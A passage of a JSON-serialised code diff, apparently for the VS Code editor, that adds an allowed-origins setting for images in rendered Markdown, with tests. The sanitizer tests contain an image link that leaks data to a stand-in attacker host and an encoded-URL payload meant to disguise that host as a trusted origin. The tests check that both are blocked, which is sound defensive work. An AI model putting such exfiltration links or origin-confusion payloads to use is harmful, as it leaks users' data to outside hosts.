wnImages, { allowedOrigins: true });","+\t\tassert.deepStrictEqual(apply({ markdownImages: { allowedOrigins: ['https://a.example'] } }).markdownImages, { allowedOrigins: ['https://a.example'] });","+\t});","+","+\ttest('keeps blocking when the option is reset', () => {","+\t\tassert.deepStrictEqual(apply({ markdownImages: undefined }, true).markdownImages, { allowedOrigins: [] });","+\t\tassert.deepStrictEqual(apply({ markdownImages: { allowedOrigins: undefined } }, true).markdownImages, { allowedOrigins: [] });","+\t});","+","+\ttest('leaves updates without markdownImages unchanged', () => {","+\t\tconst options = { fontSize: 12 };","+\t\tassert.strictEqual(applyStandaloneMarkdownImagesDefault(options, true), options);","+\t});","+});"],"additions":34,"deletions":0,"truncated":false},{"path":"src/vs/editor/test/browser/editorMarkdownSanitizer.test.ts","lines":["@@ -0,0 +1,88 @@","+/*---------------------------------------------------------------------------------------------","+ *  Copyright (c) Microsoft Corporation. All rights reserved.","+ *  Licensed under the MIT License. See License.txt in the project root for license information.","+ *--------------------------------------------------------------------------------------------*/","+","+import assert from 'assert';","+import { renderMarkdown } from '../../../base/browser/markdownRenderer.js';","+import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../base/test/common/utils.js';","+import { getEditorMarkdownSanitizerConfig } from '../../browser/editorMarkdownSanitizer.js';","+import { EditorOption, IEditorMarkdownImagesOptions } from '../../common/config/editorOptions.js';","+import { withTestCodeEditor } from './testCodeEditor.js';","+","+suite('Editor Markdown images', () => {","+","+\tensureNoDisposablesAreLeakedInTestSuite();","+","+\tconst markdown = {","+\t\tvalue: [","+\t\t\t'![remote](https://attacker.example/collect?leak=1)',","+\t\t\t'![allowed](https://img.shields.io/badge.svg)',","+\t\t\t'![inline](data:image/png;base64,iVBORw0KGgo=)',","+\t\t\t'[link](https://example.com/docs)',","+\t\t].join('\\n\\n')","+\t};","+","+\tfunction renderImageSources(markdownImages: IEditorMarkdownImagesOptions | undefined): Record<string, string | null> {","+\t\tconst result: Record<string, string | null> = {};","+\t\twithTestCodeEditor('', { markdownImages }, editor => {","+\t\t\tconst rendered = renderMarkdown(markdown, { sanitizerConfig: getEditorMarkdownSanitizerConfig(editor) });","+\t\t\tfor (const img of rendered.element.querySelectorAll('img')) {","+\t\t\t\tresult[img.getAttribute('alt')!] = img.getAttribute('src');","+\t\t\t}","+\t\t\tresult.link = rendered.element.querySelector('a')?.getAttribute('data-href') ?? null;","+\t\t\trendered.dispose();","+\t\t});","+\t\treturn result;","+\t}","+","+\ttest('allows all images by default', () => {","+\t\tconst sources = renderImageSources(undefined);","+\t\tassert.strictEqual(sources.remote, 'https://attacker.example/collect?leak=1');","+\t\tassert.strictEqual(sources.allowed, 'https://img.shields.io/badge.svg');","+\t});","+","+\ttest('blocks remote images when no origin is allowed, keeps data images and links', () => {","+\t\tconst sources = renderImageSources({ allowedOrigins: [] });","+\t\tassert.strictEqual(sources.remote, null);","+\t\tassert.strictEqual(sources.allowed, null);","+\t\tassert.strictEqual(sources.inline, 'data:image/png;base64,iVBORw0KGgo=');","+\t\tassert.strictEqual(sources.link, 'https://example.com/docs');","+\t});","+","+\ttest('allows images from the allowed origins only', () => {","+\t\tconst sources = renderImageSources({ allowedOrigins: ['https://img.shields.io/ignored-path'] });","+\t\tassert.strictEqual(sources.remote, null);","+\t\tassert.strictEqual(sources.allowed, 'https://img.shields.io/badge.svg');","+\t});","+","+\ttest('validates and normalizes allowed origins', () => {","+\t\twithTestCodeEditor('', { markdownImages: { allowedOrigins: ['HTTPS://A.example:443/x', 'http://b.example:8080', 'not a url', 'data:text/plain,x', 42 as unknown as string] } }, editor => {","+\t\t\tassert.deepStrictEqual(editor.getOption(EditorOption.markdownImages), { allowedOrigins: ['https://a.example', 'http://b.example:8080'] });","+","+\t\t\teditor.updateOptions({ markdownImages: { allowedOrigins: true } });","+\t\t\tassert.deepStrictEqual(editor.getOption(EditorOption.markdownImages), { allowedOrigins: true });","+\t\t});","+\t});","+","+\tfunction renderHtmlMediaSources(value: string, allowedOrigins: string[]): (string | null)[] {","+\t\tconst result: (string | null)[] = [];","+\t\twithTestCodeEditor('', { markdownImages: { allowedOrigins } }, editor => {","+\t\t\tconst rendered = renderMarkdown({ value, supportHtml: true }, { sanitizerConfig: getEditorMarkdownSanitizerConfig(editor) });","+\t\t\tfor (const el of rendered.element.querySelectorAll('img, video')) {","+\t\t\t\tresult.push(el.getAttribute(el.tagName === 'VIDEO' ? 'poster' : 'src'));","+\t\t\t}","+\t\t\trendered.dispose();","+\t\t});","+\t\treturn result;","+\t}","+","+\ttest('checks the origin the browser requests, not a decoded form of it', () => {","+\t\tconst value = [","+\t\t\t'<img src=\"https://trusted.example%2F@attacker.example/x.png\">',","+\t\t\t'<video poster=\"https://trusted.example%2F@attacker.example/poster.png\"></video>',","+\t\t\t'<img src=\"https://trusted.example/ok.png\">',","+\t\t].join('\\n');","+\t\tassert.deepStrictEqual(renderHtmlMediaSources(value, ['https://trusted.example']), [null, null, 'https://trusted.example/ok.png']);","+\t});","+});"],"additions":88,"deletions":0,"truncated":false},{"path":"src/vs/monaco.d.ts","lines":["@@ -3557,6 +3557,11 @@ declare namespace monaco.editor {"," \t\t * Configure the editor's hover."," \t\t */"," \t\thover?: IEditorHoverOptions;","+\t\t/**","+\t\t * Controls which remote images Markdown rendered by the editor may load,","+\t\t * for example in hovers, suggestion details and parameter hints.","+\t\t */","+\t\tmarkdownImages?: IEditorMarkdownImagesOptions;"],"additions":5,"deletions":0,"truncated":false}],"additions":389,"deletions":102,"truncated":true,"file_count":14},"error":null,"fetched_at":"2026-11-03T16:47:34.015830+00:00"}